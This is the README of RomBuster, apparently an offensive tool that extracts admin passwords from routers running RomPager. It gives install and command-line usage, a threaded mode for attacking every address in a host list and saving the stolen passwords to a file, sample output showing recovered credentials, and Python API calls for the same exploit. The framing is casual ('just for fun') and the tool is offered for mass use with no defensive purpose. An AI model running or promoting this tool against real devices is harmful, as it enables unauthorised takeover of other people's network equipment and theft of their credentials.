# RomBuster

RomBuster is a RomPager exploitation tool that allows to disclosure network device admin password.

## Features

* Exploits vulnerabilities in most popular devices with RomPager installation such as `D-Link`, `Zyxel`, `TP-Link` and `Huawei`.
* Optimized to exploit multiple devices at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/RomBuster
```

## Basic usage

To use RomBuster just type `rombuster` in your terminal.

```
usage: rombuster [-h] [--threads] [--output OUTPUT] [--input INPUT]
                 [--address ADDRESS]

RomBuster is a RomPager exploitation tool that allows to disclosure network
device admin password.

optional arguments:
  -h, --help         show this help message and exit
  --threads          Use threads for fastest work.
  --output OUTPUT    Output result to file.
  --input INPUT      Input file of addresses.
  --address ADDRESS  Single address.
```

### Examples

Let's hack my device with RomPager installation just for fun.

```shell
rombuster --address 192.168.2.1
```

**output:**

```shell
[*] (192.168.2.1) - connecting to device...
[*] (192.168.2.1) - accessing device rom...
[*] (192.168.2.1) - extracting admin password...
[i] (192.168.2.1) - password: SuperHardPassword999
```

Let's try to use opened database of hosts with `--threads` for fast exploitation.

```shell
rombuster --threads --input devices.txt --output passwords.txt
```

It will exploit all devices in `devices.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

**output:**

```shell
[*] Initializing thread #0...
[*] (x.x.x.x) - connecting to device...
[*] Initializing thread #1...
[*] (x.x.x.x) - connecting to device...
[*] Initializing thread #2...
[*] (x.x.x.x) - connecting to device...
[*] (x.x.x.x) - accessing device rom...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #0 completed.
[*] (x.x.x.x) - connecting to device...
[*] (x.x.x.x) - accessing device rom...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #1 completed.
[*] (x.x.x.x) - connecting to device...
[*] (x.x.x.x) - accessing device rom...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #2 completed.
```

## RomBuster API

RomBuster also has their own Python API that can be invoked by importing RomBuster to your code:

```python
from rombuster import RomBuster
```

### Basic functions

There are all RomBuster basic functions that can be used to exploit specified device.

* `connect(host)` - Connect specified defice by netword address.
* `exploit(device)` - Exploit connected device.

### Examples

```python
from rombuster import RomBuster

rombuster = RomBuster()

device = rombuster.connect('192.168.2.1')
print(rombuster.exploit(device))
```

**output:**

```shell
'SuperHardPassword999'
```
